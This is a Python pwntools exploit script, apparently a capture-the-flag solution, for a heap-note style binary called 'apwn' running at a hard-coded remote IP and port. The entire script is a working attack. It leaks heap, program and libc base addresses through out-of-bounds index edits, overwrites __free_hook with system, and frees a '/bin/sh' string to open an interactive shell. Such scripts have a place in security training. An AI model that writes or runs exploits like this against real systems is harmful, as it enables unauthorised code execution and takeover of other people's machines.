from pwn import *
from time import sleep
import sys

context.arch = 'amd64'
status	= sys.argv[1]
elf 	= ELF("./apwn")
host 	= "211.159.175.39"
port 	= 8686
libc 	= ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
if status == 'l':
	io = process("./apwn")
	context.log_level = "debug"
elif status == 'r':
	io = remote(host,port)

def choice(c):
	sleep(0.2)
	io.sendlineafter(">>\n",str(c))
def single(name):
	choice(1)
	io.sendafter("Name:\n",name)
def lucky(name,cp_name):
	choice(2)
	io.sendafter("Name\n",name)
	io.sendafter("your partner's name\n",cp_name)
def edit_single(idx,new_name):
	choice(3)
	io.sendlineafter("which?",str(idx))
	io.sendafter("Oh,singledog,changing your name can bring you good luck.\n",new_name)
def edit_lucky(idx,new_name,new_cp_name):
	choice(4)
	io.sendlineafter("which?",str(idx))
	io.sendafter("Oh,luckydog,What is your new name?\n",new_name)
	io.sendafter("your partner's new name\n",new_cp_name)
def save_single():
	choice(5)

lucky("0000","0001")
single("0000")

edit_single((0x2e0-0x60)/8,"\xa0")
io.recvuntil("new name: ")
heap_base = (u64(io.recv(6).ljust(8,'\x00'))&0xfffffffff000)
success("HEAP BASE -> %#x"%heap_base)

edit_single((0x08-0x60)/8,"\x08")
io.recvuntil("new name: ")
proc_base = (u64(io.recv(6).ljust(8,'\x00'))-0x202008)
success("PROC BASE -> %#x"%proc_base)

edit_single((0x2e0-0x60)/8,p64(proc_base+elf.sym['two']))
edit_lucky(0,"****",p64(proc_base+elf.sym['stderr']))
edit_single(0,"\x80")
io.recvuntil("new name: ")
libc_base = (u64(io.recv(6).ljust(8,'\x00')))-libc.sym['_IO_2_1_stderr_']
success("LIBC BASE -> %#x"%libc_base)

edit_lucky(0,"echo X;/bin/sh\x00",p64(libc_base+libc.sym['__free_hook']))
edit_single(0,p64(libc_base+libc.sym['system']))
#edit_lucky(0,"/bin/sh\x00",p64(libc_base+0x1bd8e8))
#edit_single(0,p64(libc_base+0x44cb0))
#edit_single((0x2e0-0x60)/8,p64(heap_base+0x678))
lucky("/bin/sh\x00","/bin/sh\x00")
save_single()
io.interactive()
